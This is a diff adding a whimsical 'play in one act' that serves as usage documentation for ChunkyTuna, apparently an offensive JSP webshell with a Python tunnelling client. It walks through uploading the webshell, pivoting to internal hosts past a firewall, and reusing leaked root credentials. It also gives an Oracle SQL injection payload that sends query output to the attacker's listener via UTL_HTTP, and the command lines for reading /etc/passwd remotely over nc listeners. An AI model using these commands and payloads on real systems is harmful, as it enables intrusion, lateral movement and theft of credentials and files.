@@ -1,0 +1,171 @@
+# ChunkyTuna - a play in one act
+
+## Act I   
+
+### Act I Scene I - Prelude
+
+Enter WEBSERVER and ATTACKER
+
+ > WEBSERVER: Hello Attacker! I see you might have something for me.
+
+ > ATTACKER: Hello Victim! Yes indeed, I have for you this beautiful
+ > `chunkytuna.jsp` file, henceforth called WEBSHELL
+
+ATTACKER uploads `chunkytuna.jsp` to WEBSERVER.
+
+ > WEBSERVER: Thank you! I shall prepare it for you then
+
+WEBSERVER loads the WEBSHELL.
+
+Exit WEBSERVER.
+
+### Act I   Scene II - A Connection
+
+Where ATTACKER rides an unsuspecting WEBSERVER and reads their inner secrets
+beyond the mighty FIREWALL thanks to an accomplice.
+
+Enter ATTACKER and WEBSHELL.
+
+ > ATTACKER: I think I shall now connect to the WEBSHELL using this magnificent CLIENT!
+
+ATTACKER runs `python chunkytuna.py http://WEBSERVER:8888/c/chunkytuna.jsp  -t TARGET:80 -r 127.0.0.1:12345 C`. Magically, CLIENT appears:
+
+ > CLIENT: Greetings my lord! I am ready to proceed and I shall await for your command.
+
+ > ATTACKER: Excellent, excellent. Now I shall open this CONSOLE to be my messenger!
+
+ATTACKER runs `nc localhost 12345`.
+
+Enter CONSOLE, a dark figure with a white, blinking cursor on the left.
+
+ > CONSOLE: I am your humble servant and shall now connect to CLIENT to carry
+ > your messages or powerful ATTACKER!
+
+Unbeknowst to ATTACKER, CONSOLE and CLIENT engage in a quiet conversation:
+
+ > CLIENT: Behold! A Connection from a CONSOLE! I will now inform WEBSHELL to proceed.
+
+CLIENT connects to WEBSHELL.
+
+ > CLIENT: O trusted WEBSHELL, here is your command: connect to `TARGET:80` and report back to me.
+
+ > WEBSHELL: As you wish.
+
+WEBSHELL connects to TARGET:80.
+
+ > WEBSHELL: Dear CLIENT, I have connected to TARGET:80 and in this envelope you shall find the response.
+
+WEBSHELL hands over to CLIENT an envelope. On the envelope a number is written.
+
+ > CLIENT: Thank you WEBSHELL. I reckon this number is the size of the message. I
+ > shall pass this to my master.
+
+CLIENT opens the envelope and gives its content to CONSOLE.
+
+ > CLIENT: O Console, here is what you commanded.
+
+CONSOLE receives the content and proudly displays it to ATTACKER who is well pleased. The content said:
+
+ > Hello, This is an internal only webserver. Please log in using the following credentials: root/password1
+
+The ATTACKER will then instruct WEBSHELL to connect to TARGET:22 and will henceforth impersonate the almighty `root` user using the magic `password`.....
+
+
+
+### Act I    Scene III - A trick.
+
+Where ATTACKER tricks a DECEIVED entity to willingfully approach an evil WEBSHELL.
+
+Enter ATTACKER and WEBSHELL.
+
+ > ATTACKER: I think I shall now connect to the WEBSHELL using this magnificent CLIENT!
+
+ATTACKER runs `python chunkytuna.py http://WEBSERVER:8888/c/chunkytuna.jsp  -t WEBSHELL:12345 -r 127.0.0.1:1234 L`. Magically, CLIENT appears:
+
+ > CLIENT: Greetings my lord! I am ready to proceed and I shall await for your command.
+
+ > ATTACKER: Excellent, excellent. Now I shall open this CONSOLE to be my messenger!
+
+ATTACKER runs `nc -nlvp 1234`.
+
+Enter CONSOLE, a dark figure with a white, blinking cursor on the left.
+
+ > CONSOLE: I am your humble servant and shall now wait for CLIENT to command me.
+
+Enter DECEIVED, an unsuspecting young service.
+
+ > ATTACKER: DECEIVED! My friend, how are you?
+
+ > DECEIVED: I am well thank you, but I am not allowed to speak to you I'm afraid.
+
+ > ATTACKER: Oh don't you worry, I shall not bother you. I've heard however
+ > that you might be allowed to speak to WEBSERVER?
+
+ > DECEIVED: Yes I am allowed to speak to WEBSERVER.
+
+ > ATTACKER: Excelsior! Then please do me a favour, and allow me to ask you the following QUERY:
+
+        SELECT * FROM products WHERE id=1||UTL_HTTP.request('http://WEBSHELL:12345/'||(SELECT user FROM DUAL)) -- 
+
+DECEIVED executes the QUERY which sends its output to WEBSHELL:12345.
+
+Unbeknowst to ATTACKER, CONSOLE, WEBSHELL and CLIENT engage in a quiet conversation:
+
+ > WEBSHELL: Oh my! A connection from someone at port 12345. Looks like DECEIVED
+ > sent me a message. I shall pass this on to CLIENT.
+
+ > CLIENT: WEBSERVER my trusted friend. I see you sent me an envelope with a
+ > number. I shall pass the content of such envelope to CONSOLE.
+
+CLIENT connects to CONSOLE:1234
+
+ > CLIENT: Console, here is something for you.
+
+CLIENT gives CONSOLE the content of the envelope.
+
+CONSOLE receives the content and proudly displays it to ATTACKER who is well pleased.
+
+
+### Act I Scene IV: An execution.
+
+Where ATTACKER pilfers the content of the ancient scroll `/etc/passwd` from the WEBSERVER.
+
+Enter ATTACKER and WEBSHELL.
+
+ > ATTACKER: I think I shall now connect to the WEBSHELL using this magnificent CLIENT!
+
+ATTACKER runs `python chunkytuna.py http://WEBSERVER:8888/c/chunkytuna.jsp  -t "cat /etc/passwd" -r 127.0.0.1:12345 X`. Magically, CLIENT appears:
+
+ > CLIENT: Greetings my lord! I am ready to proceed and I shall await for your command.
+
+ > ATTACKER: Excellent, excellent. Now I shall open this CONSOLE to be the recipient of my evil wizardry.
+
+ATTACKER runs `nc -v localhost 12345  > out`
+
+Enter CONSOLE, a dark figure with a white, blinking cursor on the left.
+
+Unbeknowst to ATTACKER, a quiet conversation happens between CONSOLE, CLIENT and WEBSHELL.
+
+ > CONSOLE: o CLIENT, here I am. Thank you for waiting. Now proceed with your deed!
+
+ > CLIENT: By Jove! A connection to my local port 12345! It must be my master
+ > through the trusted CONSOLE; I shall immediately inform WEBSHELL to obey my
+ > commands!
+
+CLIENT tells WEBSHELL to hasten!
+
+WEBSHELL executes `cat /etc/passwd` and reports back to CLIENT.
+
+ > WEBSHELL: CLIENT, my trusted friend. Here is what you asked for, in a nice envelope.
+
+ > CLIENT: Thank you my dear WEBSHELL, my master shall be pleased.
+
+CLIENT takes the content of the envelope and gives it quietly to CONSOLE. Suddently on the CONSOLE, the cursor DISAPPEARS!
+
+ > CONSOLE: O mighty ATTACKER, thy will is done. What you asked is where you wanted it.
+
+ATTACKER opens the `out` file and is pleased.
+
+## Act II
+
+WEBSERVER, forgotten in this adventure, will continue running WEBSHELL unaware of the danger....
